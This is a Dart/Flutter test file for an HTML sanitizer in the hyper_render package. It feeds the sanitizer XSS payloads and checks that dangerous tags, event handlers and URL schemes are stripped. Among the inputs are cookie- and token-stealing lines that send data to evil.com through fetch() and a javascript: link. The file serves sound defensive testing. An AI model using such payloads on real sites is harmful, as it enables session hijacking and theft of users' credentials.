import "package:hyper_render/hyper_render.dart";
import 'package:flutter_test/flutter_test.dart';

/// Edge cases and attack vectors for HTML sanitization
void main() {
  group('Security Edge Cases', () {
    group('Encoding Attacks', () {
      test('blocks HTML entity encoded script tags', () {
        const html = '&lt;script&gt;alert(1)&lt;/script&gt;';
        final result = HtmlSanitizer.sanitize(html);

        // Should not contain decoded script
        expect(result.toLowerCase(), isNot(contains('<script')));
      });

      test('blocks URL encoded javascript', () {
        const html = '<a href="%6a%61%76%61%73%63%72%69%70%74:alert(1)">Link</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('javascript')));
      });

      test('blocks mixed case javascript', () {
        const html = '<a href="JaVaScRiPt:alert(1)">Link</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result.toLowerCase(), isNot(contains('javascript')));
      });
    });

    group('Nested Tags', () {
      test('removes nested dangerous tags', () {
        const html = '''
          <div>
            <p>
              <script>
                <script>alert(1)</script>
              </script>
            </p>
          </div>
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('<script')));
        expect(result, contains('<div>'));
        expect(result, contains('<p>'));
      });

      test('removes script inside allowed tags', () {
        const html = '<p>Safe<script>bad()</script>text</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('<p>'));
        expect(result, isNot(contains('script')));
      });
    });

    group('Attribute Injection', () {
      test('blocks onload in body tag', () {
        const html = '<body onload="alert(1)"><p>Content</p></body>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onload')));
      });

      test('blocks multiple event handlers', () {
        const html = '''
          <img src="x"
               onerror="alert(1)"
               onload="bad()"
               onclick="evil()">
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onerror')));
        expect(result, isNot(contains('onload')));
        expect(result, isNot(contains('onclick')));
      });

      test('blocks event handlers with spaces', () {
        const html = '<div on click="bad()">Content</div>';
        // ignore: unused_local_variable
        final result = HtmlSanitizer.sanitize(html);

        // Current implementation may not catch spaces, document limitation
        // In production, consider using proper HTML parser
      });
    });

    group('Protocol Handlers', () {
      test('blocks vbscript protocol', () {
        const html = '<a href="vbscript:msgbox(1)">Link</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('vbscript:')));
        expect(result, contains('Link')); // text preserved
      });

      test('blocks SVG data URL (can embed script)', () {
        const html =
            '<img src="data:image/svg+xml,<svg><script>alert(1)</script></svg>">';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('data:image/svg')));
      });

      test('allows safe protocols', () {
        const html = '''
          <a href="https://example.com">HTTPS</a>
          <a href="http://example.com">HTTP</a>
          <a href="mailto:user@example.com">Email</a>
          <a href="tel:+1234567890">Phone</a>
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('https://'));
        expect(result, contains('http://'));
        expect(result, contains('mailto:'));
        expect(result, contains('tel:'));
      });

      test('blocks data URLs in href (non-image)', () {
        const html = '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('data:text/html')));
      });

      test('allows data URLs for images', () {
        const html = '<img src="data:image/png;base64,iVBORw0KGgo=">';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('data:image/png'));
      });
    });

    group('SVG Attacks', () {
      test('blocks script in SVG', () {
        const html = '''
          <svg onload="alert(1)">
            <script>alert(2)</script>
          </svg>
        ''';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('onload')));
        expect(result, isNot(contains('<script')));
      });
    });

    group('CSS Injection', () {
      test('allows safe inline styles', () {
        const html = '<p style="color: red; font-size: 16px;">Text</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('style'));
        expect(result, contains('color: red'));
      });

      test('blocks CSS style with javascript: url', () {
        const html = '<p style="background: url(javascript:alert(1))">Text</p>';
        final result = HtmlSanitizer.sanitize(html);

        // style attribute is stripped because it contains javascript:
        expect(result, isNot(contains('javascript:')));
      });

      test('blocks CSS expression() in style attribute', () {
        const html = '<p style="width: expression(alert(1))">Text</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('expression(')));
        expect(result, contains('Text')); // text preserved
      });
    });

    group('Comment Attacks', () {
      test('preserves HTML comments', () {
        const html = '<!-- Comment --><p>Text</p><!-- Another -->';
        // ignore: unused_local_variable
        final result = HtmlSanitizer.sanitize(html);

        // Note: Current implementation may keep comments
        // Consider stripping comments in production
      });
    });

    group('Unicode and Special Characters', () {
      test('handles unicode in content', () {
        const html = '<p>Hello 世界 🌍</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('Hello 世界 🌍'));
      });

      test('handles RTL text', () {
        const html = '<p dir="rtl">مرحبا</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('dir'));
        expect(result, contains('مرحبا'));
      });
    });

    group('Malformed HTML', () {
      test('handles unclosed tags', () {
        const html = '<p>Text<p>More';
        final result = HtmlSanitizer.sanitize(html);

        // Should not crash
        expect(result, isNotEmpty);
      });

      test('handles mismatched tags', () {
        const html = '<div><p></div></p>';
        final result = HtmlSanitizer.sanitize(html);

        // Should not crash
        expect(result, isNotEmpty);
      });

      test('handles deeply nested tags', () {
        var html = '<div>';
        for (var i = 0; i < 100; i++) {
          html += '<p>';
        }
        html += 'Deep content';
        for (var i = 0; i < 100; i++) {
          html += '</p>';
        }
        html += '</div>';

        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('Deep content'));
      });
    });

    group('Performance Edge Cases', () {
      test('handles very long attribute values', () {
        final longValue = 'x' * 10000;
        final html = '<p title="$longValue">Text</p>';

        final stopwatch = Stopwatch()..start();
        final result = HtmlSanitizer.sanitize(html);
        stopwatch.stop();

        expect(stopwatch.elapsedMilliseconds, lessThan(1000));
        expect(result, isNotEmpty);
      });

      test('handles many tags', () {
        final html = '<p>Text</p>' * 1000;

        final stopwatch = Stopwatch()..start();
        final result = HtmlSanitizer.sanitize(html);
        stopwatch.stop();

        expect(stopwatch.elapsedMilliseconds, lessThan(1000));
        expect(result, contains('<p>'));
      });

      test('handles many attributes', () {
        var html = '<div ';
        for (var i = 0; i < 100; i++) {
          html += 'data-attr-$i="value$i" ';
        }
        html += '>Content</div>';

        final result = HtmlSanitizer.sanitize(html);
        expect(result, isNotEmpty);
      });
    });

    group('Whitelist Bypass Attempts', () {
      test('cannot bypass with similar tag names', () {
        const html = '<scr<script>ipt>alert(1)</script>';
        // ignore: unused_local_variable
        final result = HtmlSanitizer.sanitize(html);

        // Note: Regex-based sanitizer has limitations
        // In production, use proper HTML parser
      });

      test('cannot bypass with null bytes', () {
        final html = '<script\x00>alert(1)</script>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('alert')));
      });
    });

    group('Real World Attack Vectors', () {
      test('stored XSS in blog comments', () {
        const userComment = '''
          Great article!
          <img src=x onerror="
            fetch('https://evil.com/steal?cookie=' + document.cookie)
          ">
        ''';

        final result = HtmlSanitizer.sanitize(userComment);

        expect(result, contains('Great article!'));
        expect(result, isNot(contains('onerror')));
        expect(result, isNot(contains('fetch')));
      });

      test('DOM-based XSS via href', () {
        const html = '''
          <a href="javascript:void(
            window.location='https://evil.com?s='+sessionStorage.token
          )">Click me</a>
        ''';

        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('javascript:')));
        expect(result, isNot(contains('sessionStorage')));
      });

      test('reflected XSS in search results', () {
        const searchQuery = '<script>alert(document.domain)</script>';
        final html = '<p>Search results for: $searchQuery</p>';

        final result = HtmlSanitizer.sanitize(html);

        expect(result, contains('Search results for:'));
        expect(result, isNot(contains('<script')));
      });

      test('mutation XSS (mXSS)', () {
        const html = '<noscript><p>Text</p></noscript>';
        final result = HtmlSanitizer.sanitize(html);

        // Note: mXSS is complex and may require browser-based testing
        expect(result, isNotEmpty);
      });
    });

    group('Known Limitations', () {
      test('blocks IE CSS expression() attack', () {
        const html = '<p style="expression(alert(1))">IE only</p>';
        final result = HtmlSanitizer.sanitize(html);

        expect(result, isNot(contains('expression(')));
        expect(result, contains('IE only')); // text preserved
      });

      test('containsDangerousContent flags vbscript', () {
        expect(
          HtmlSanitizer.containsDangerousContent('<a href="vbscript:foo">'),
          isTrue,
        );
      });

      test('containsDangerousContent flags expression()', () {
        expect(
          HtmlSanitizer.containsDangerousContent(
              '<p style="expression(alert(1))">'),
          isTrue,
        );
      });

      test('DOCUMENT: HTML5 new attack vectors may not be covered', () {
        // New HTML5 features may introduce new attack vectors
        // Regular security updates needed
      });
    });
  });

  group('Sanitization Performance Benchmarks', () {
    test('small document (1KB)', () {
      final html = '<p>Test</p>' * 20; // ~1KB

      final stopwatch = Stopwatch()..start();
      for (var i = 0; i < 100; i++) {
        HtmlSanitizer.sanitize(html);
      }
      stopwatch.stop();

      final avgTime = stopwatch.elapsedMilliseconds / 100;
      expect(avgTime, lessThan(10)); // < 10ms average
    });

    test('medium document (10KB)', () {
      final html = '<p>${'Safe text. ' * 100}</p>' * 20; // ~10KB

      final stopwatch = Stopwatch()..start();
      for (var i = 0; i < 10; i++) {
        HtmlSanitizer.sanitize(html);
      }
      stopwatch.stop();

      final avgTime = stopwatch.elapsedMilliseconds / 10;
      expect(avgTime, lessThan(50)); // < 50ms average
    });

    test('large document (100KB)', () {
      final html = '<p>${'Safe text. ' * 1000}</p>' * 20; // ~100KB

      final stopwatch = Stopwatch()..start();
      HtmlSanitizer.sanitize(html);
      stopwatch.stop();

      expect(stopwatch.elapsedMilliseconds, lessThan(200)); // < 200ms
    });
  });
}
